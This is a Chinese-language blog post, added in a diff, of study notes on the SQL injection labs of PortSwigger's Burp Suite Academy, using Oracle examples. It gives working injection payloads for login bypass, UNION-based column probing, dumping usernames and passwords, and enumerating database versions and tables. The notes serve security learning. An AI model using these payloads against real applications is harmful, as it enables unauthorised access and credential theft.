@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="bp实验室SQL漏洞学习笔记 (示例使用的是Oracle数据库)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL漏洞学习笔记">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/21833.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="bp实验室SQL漏洞学习笔记 (示例使用的是Oracle数据库)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c84d88d0e0a243d40cdb3b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c8631ad0e0a243d40ce355.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c9c8d1066befcec6df56bb.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c9ced3066befcec6df57d6.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67ca608b066befcec6dfa0b9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67caac3a066befcec6e0368e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67caaf48066befcec6e03c91.png">
+<meta property="article:published_time" content="2025-03-05T01:47:27.000Z">
+<meta property="article:modified_time" content="2025-03-07T08:37:54.988Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67c84d88d0e0a243d40cdb3b.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/21833.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SQL漏洞学习笔记 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">59</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/21833.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL漏洞学习笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-05 09:47:27" itemprop="dateCreated datePublished" datetime="2025-03-05T09:47:27+08:00">2025-03-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-07 16:37:54" itemprop="dateModified" datetime="2025-03-07T16:37:54+08:00">2025-03-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67c7ad9cd0e0a243d40bf84b.png" class="img-topic">
+        </div>
+      
+      
+        <p>bp实验室SQL漏洞学习笔记 (示例使用的是Oracle数据库)</p>
+<span id="more"></span>
+<h2 id="什么是SQL注入-sqli"><a href="#什么是SQL注入-sqli" class="headerlink" title="什么是SQL注入(sqli)"></a>什么是SQL注入(sqli)</h2><p>sql注入指的是针对服务器的数据库进行攻击的一种手段，通过对数据库的干扰，让攻击者可以看到一些敏感的信息，包括其他用户的信息，密码，信用卡，个人信息等，在很多情况下还可以修改和删除数据。在某些情况下，攻击者可以获得进入组织系统的持久后门，从而导致长期入侵，并且可能在很长一段时间内都不会被发现。</p>
+<h2 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h2><p>可以使用手动检测sql漏洞，通常可以利用一下几种方式：</p>
+<ul>
+<li>单引号<code>&#39;</code>查找异常</li>
+<li>通过sql的基础语法，在入口点对不同的值做出评估，找出不同</li>
+<li>布尔条件，比如<code>OR 1=1``OR 1=2</code>判断有什么不同</li>
+<li>通过时间判断，通过触发sql时间延迟的payload来找到响应时间的差异</li>
+<li>通过OAST外带网络，看是否可以与外部网络进行交互</li>
+</ul>
+<p>大多数的SQL漏洞都发生在<code>WHERE</code> 和 <code>SELECT</code>语句<br>但是，SQL 注入漏洞可能发生在查询中的任何位置，以及不同的查询类型中。SQL 注入出现的其他一些常见位置包括：</p>
+<ul>
+<li>在UPDATE语句中，在更新的值或WHERE子句内。</li>
+<li>在INSERT语句中，在插入的值内。</li>
+<li>在SELECT语句中，在表或列名称内。</li>
+<li>在SELECT语句中，在ORDER BY子句内。</li>
+</ul>
+<h2 id="SQL注入示例"><a href="#SQL注入示例" class="headerlink" title="SQL注入示例"></a>SQL注入示例</h2><p>下面是一些常见的SQL注入示例<br>包括 检索隐藏数据  修改应用逻辑判断（通过查询语句来干扰程序的逻辑）union攻击（查询不同的数据表）  盲sql（sql没有回显）</p>
+<h3 id="检索隐藏数据"><a href="#检索隐藏数据" class="headerlink" title="检索隐藏数据"></a>检索隐藏数据</h3><p>比如现在你要对一个商品的种类进行查询，你发送的请求大概是</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//insecure-website.com/products?category=Gifts</span></span><br></pre></td></tr></table></figure></div>
+<p>这就会让程序执行数据库查询</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category = <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released = <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>这就让数据返回<br><code>*</code> : 所有数据  <code>products</code> : 来自这个表里的内容 <code>category = &#39;Gifts&#39;</code> : 查询种类为Gifts的数据 <code>released = 1</code> : 可能是对用户查询的限制，比如未发售的产品released&#x3D;0</p>
+<p>如果这个网站没有进行任何的sql注入防御,就会造成以下攻击</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OXYGENE"><figure class="iseeu highlight /oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//insecure-website.com/products?category=Gifts&#x27;--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category = <span class="string">&#x27;Gifts&#x27;</span>--<span class="string">&#x27; AND released = 1</span></span><br></pre></td></tr></table></figure></div>
+<p>当这个查询语句被拼接上去时，<code>&#39;</code>会先闭合引号，<code>--</code>是sql的注释符，就会把后面的<code>AND released = 1</code>注释掉，这样子用户就可以访问到所有的商品，包括没有发布的，还可以查询所有类型的商品</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https</span>://insecure-website.com/products?category=Gifts&#x27;+OR+<span class="number">1</span>=<span class="number">1</span>--</span><br></pre></td></tr></table></figure></div>
+<p>修改后的查询将返回category为Gifts或1等于1所有项目。由于1&#x3D;1始终为真，因此查询将返回所有项目。<br>但是要注意：<br>将条件OR 1&#x3D;1注入 SQL 查询时要小心谨慎。即使在 注入的上下文中看起来无害，应用程序在多个不同的查询中使用来自单个请求的数据也很常见。<br>例如，如果 的条件到达UPDATE或DELETE语句，则可能会导致意外的数据丢失。</p>
+<h3 id="改变应用程序的逻辑"><a href="#改变应用程序的逻辑" class="headerlink" title="改变应用程序的逻辑"></a>改变应用程序的逻辑</h3><p>比如一个程序是让用户通过用户名和密码登录，如果用户提交用户名wiener和密码bluecheese ，则应用程序通过执行以下 SQL 查询来检查凭据：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">&#x27;wiener&#x27;</span> <span class="keyword">AND</span> <span class="keyword">password</span> = <span class="string">&#x27;bluecheese&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在这种情况下，攻击者可以以任何用户身份登录，而无需密码。他们可以使用 SQL 注释序列–从查询的WHERE子句中删除密码检查。例如，提交用户名administrator’–和空白密码会导致以下查询：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">&#x27;administrator&#x27;</span>--<span class="string">&#x27; AND password = &#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="从其他数据表检索信息-UNION攻击"><a href="#从其他数据表检索信息-UNION攻击" class="headerlink" title="从其他数据表检索信息 (UNION攻击)"></a>从其他数据表检索信息 (UNION攻击)</h3><p>如果应用程序以 SQL 查询结果作为响应，攻击者可以利用 SQL 注入漏洞从数据库内的其他表中检索数据<br>利用<code>UNION</code>关键字可以执行额外的查询<br>例如，如果应用程序执行包含用户输入Gifts的以下查询：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">name</span>, description <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category = <span class="string">&#x27;Gifts&#x27;</span></span><br></pre></td></tr></table></figure></div>
+<p>攻击者可以执行以下的查询</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> users--</span><br></pre></td></tr></table></figure>
+<p>这会导致应用程序返回所有用户名和密码以及产品名称和描述。</p>
+<p>为了使UNION查询正常工作，必须满足两个关键要求：</p>
+<ul>
+<li>各个查询必须返回相同数量的列。</li>
+<li>每列中的数据类型必须在各个查询之间兼容。<br>要执行 SQL 注入 UNION 攻击，要确保攻击满足以下两个要求</li>
+<li>原始查询返回了多少列。</li>
+<li>从原始查询返回的哪些列具有合适的数据类型来保存注入查询的结果。</li>
+</ul>
+<h4 id="确定所需的列数"><a href="#确定所需的列数" class="headerlink" title="确定所需的列数"></a>确定所需的列数</h4><p>执行 SQL 注入 UNION 攻击时，有两种有效的方法可以确定从原始查询返回了多少列。<br>一种方法是注入一系列ORDER BY子句并增加指定的列索引，直到发生错误。例如，如果注入点是原始查询的WHERE子句中的带引号的字符串，则应提交：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="keyword">ORDER</span> <span class="title">BY</span> <span class="number">1</span>--</span><br><span class="line">&#x27; <span class="keyword">ORDER</span> <span class="title">BY</span> <span class="number">2</span>--</span><br><span class="line">&#x27; <span class="keyword">ORDER</span> <span class="title">BY</span> <span class="number">3</span>--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure></div>
+<p>ORDER BY子句中的列可以通过其索引指定，因此 不需要知道任何列的名称。当指定的列索引超出结果集中的实际列数时，数据库将返回错误，例如：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The ORDER BY <span class="keyword">position</span> <span class="keyword">number</span> <span class="number">3</span> is <span class="keyword">out</span> of <span class="built_in">range</span> of the <span class="keyword">number</span> of items <span class="keyword">in</span> the <span class="keyword">select</span> list.</span><br></pre></td></tr></table></figure></div>
+<p>应用程序实际上可能会在其 HTTP 响应中返回数据库错误，但也可能发出一般错误响应。在其他情况下，它可能根本不返回任何结果。无论哪种情况，只要 可以检测到响应中的一些差异，就可以推断出查询返回了多少列。<br>第二种方法涉及提交一系列指定不同数量的空值的UNION SELECT：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span>--</span><br><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span>,<span class="built_in">NULL</span>--</span><br><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span>,<span class="built_in">NULL</span>,<span class="built_in">NULL</span>--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure></div>
+<p>如果空值的数量与列数不匹配，数据库将返回错误，例如：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">All</span> queries combined <span class="keyword">using</span> a <span class="keyword">UNION</span>, <span class="keyword">INTERSECT</span> <span class="keyword">or</span> <span class="keyword">EXCEPT</span> <span class="keyword">operator</span> must have an equal number <span class="keyword">of</span> expressions <span class="keyword">in</span> their target lists.</span><br></pre></td></tr></table></figure></div>
+<p>我们使用NULL作为注入的SELECT查询的返回值，因为每列中的数据类型必须在原始查询和注入查询之间兼容.NULL可转换为每种常见数据类型，因此当列数正确时，它可以最大限度地提高payload成功的机会。<br><img src="https://pic1.imgdb.cn/item/67c84d88d0e0a243d40cdb3b.png"><br>这里就是有三列，所以输入三个NULL，可以正常访问，输入其他数量的NULL就无法访问到商品数据</p>
+<h4 id="数据库特定的语法"><a href="#数据库特定的语法" class="headerlink" title="数据库特定的语法"></a>数据库特定的语法</h4><p>在 Oracle 上，每个SELECT查询都必须使用FROM关键字并指定一个有效的表。Oracle 上有一个名为dual内置表可用于此目的。因此，Oracle 上的注入查询需要如下所示：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span> FROM DUAL--</span><br></pre></td></tr></table></figure></div>
+<p>在 MySQL 上，双破折号序列后面必须有一个空格。或者，可以使用井号#来标识注释。<br>sql注入速查表：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+<h4 id="查找具有有用数据类型的列"><a href="#查找具有有用数据类型的列" class="headerlink" title="查找具有有用数据类型的列"></a>查找具有有用数据类型的列</h4><p>SQL 注入 UNION 攻击可让 检索注入查询的结果。 想要检索的有趣数据通常为字符串形式。这意味着 需要在原始查询结果中找到一个或多个数据类型为字符串数据或与字符串数据兼容的列。<br>确定所需列数后， 可以探测每列以测试其是否可以容纳字符串数据。 可以提交一系列UNION SELECT，依次将字符串值放入每列中。例如，如果查询返回四列，则 可以提交：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VHDL"><figure class="iseeu highlight /vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="symbol">&#x27;a</span>&#x27;,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="symbol">&#x27;a</span>&#x27;,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="symbol">&#x27;a</span>&#x27;,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="symbol">&#x27;a</span>&#x27;<span class="comment">--</span></span><br></pre></td></tr></table></figure></div>
+<p>如果列数据类型与字符串数据不兼容，则注入的查询将导致数据库错误，如果没有发生错误，并且应用程序的响应包含一些额外的内容（包括注入的字符串值），那么相关列适合检索字符串数据。</p>
+<h4 id="使用-SQL-注入-UNION-攻击来检索有趣的数据"><a href="#使用-SQL-注入-UNION-攻击来检索有趣的数据" class="headerlink" title="使用 SQL 注入 UNION 攻击来检索有趣的数据"></a>使用 SQL 注入 UNION 攻击来检索有趣的数据</h4><p>当 确定了原始查询返回的列数并发现哪些列可以保存字符串数据时， 就可以检索有趣的数据。<br>现在假设：1.原始查询返回两列，并且两列都可以保存字符串吗。2.注入点是WHERE子句内的带引号的字符串。3.数据库包含一个名为users表，其中包含username和password 。</p>
+<p>所以sql注入的语句可以是</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> users--</span><br></pre></td></tr></table></figure>
+<p>为了执行此攻击， 需要知道有一个名为users的表，其中包含两列，分别称为username和password 。如果没有这些信息， 将不得不猜测表和列的名称。所有现代数据库都提供了检查数据库结构并确定它们包含哪些表和列的方法。</p>
+<h4 id="检索单个列中的多个值"><a href="#检索单个列中的多个值" class="headerlink" title="检索单个列中的多个值"></a>检索单个列中的多个值</h4><p>在某些情况下，上例中的查询可能仅返回单个列。可以通过将值连接在一起来检索此单个列中的多个值。 可以添加分隔符来区分组合的值。例如，在 Oracle 上， 可以提交输入：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> username || <span class="string">&#x27;~&#x27;</span> || <span class="keyword">password</span> <span class="keyword">FROM</span> users--</span><br></pre></td></tr></table></figure>
+<p>这使用了双管道序列||这是 Oracle 上的字符串连接运算符。注入的查询将username和password字段的值连接在一起，以~字符分隔。<br>其他几个数据库的拼接语句</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span>  <span class="string">&#x27;foo&#x27;</span>+<span class="string">&#x27;bar&#x27;</span></span><br><span class="line">PostgreSQL  <span class="string">&#x27;foo&#x27;</span>||<span class="string">&#x27;bar&#x27;</span> </span><br><span class="line">            <span class="string">&#x27;foo&#x27;</span> <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">MySQL       <span class="string">&#x27;foo&#x27;</span> <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">            CONCAT(<span class="string">&#x27;foo&#x27;</span>,<span class="string">&#x27;bar&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>mysql除了concat还有group_concat也是很常用的拼接函数<br><img src="https://pic1.imgdb.cn/item/67c8631ad0e0a243d40ce355.png"><br>比如在这里先用UNION查询NULL知道有两列数据，然后查询字符串，知道只有第二列可以返回查询，然后就用oracle上面的拼接查询两个字段</p>
+<h2 id="常见数据库中检查是否存在sql注入攻击"><a href="#常见数据库中检查是否存在sql注入攻击" class="headerlink" title="常见数据库中检查是否存在sql注入攻击"></a>常见数据库中检查是否存在sql注入攻击</h2><p>上面说完了sql注入示例，那现在当然要知道什么时候可以进行sql注入攻击，对于不同的数据库，方式也不同<br>要利用 SQL 注入漏洞，通常需要查找有关数据库的信息。 其中包括</p>
+<ul>
+<li>数据库软件的类型和版本。</li>
+<li>数据库包含的表和列。</li>
+</ul>
+<h3 id="查询数据库类型和版本"><a href="#查询数据库类型和版本" class="headerlink" title="查询数据库类型和版本"></a>查询数据库类型和版本</h3><p>以下是一些用于确定某些流行数据库类型的数据库版本的查询：<br>Microsoft, MySQL  SELECT @@version<br>Oracle   SELECT * FROM v$version<br>        SELECT banner FROM v$version<br>          SELECT version FROM v$instance<br>PostgreSQL  SELECT version()<br>可以使用UNION攻击 （使用之前要先查在哪一列回显信息）</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="comment">@@</span>version--</span><br></pre></td></tr></table></figure></div>
+<p>在 Oracle 数据库上，每个SELECT语句都必须指定要从FROM选择的表。 如果 的UNION SELECT攻击不从表中查询， 仍然需要包含FROM关键字，后跟有效的表名。<br>Oracle 中有一个名为dual内置表</p>
+<h3 id="列出数据库的内容"><a href="#列出数据库的内容" class="headerlink" title="列出数据库的内容"></a>列出数据库的内容</h3><p>大多数数据库类型（Oracle 除外）都有一组称为信息模式的视图。它提供有关数据库的信息。<br>例如， 可以查询information_schema.tables来列出数据库中的表：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.tables</span><br><span class="line"></span><br><span class="line">TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span 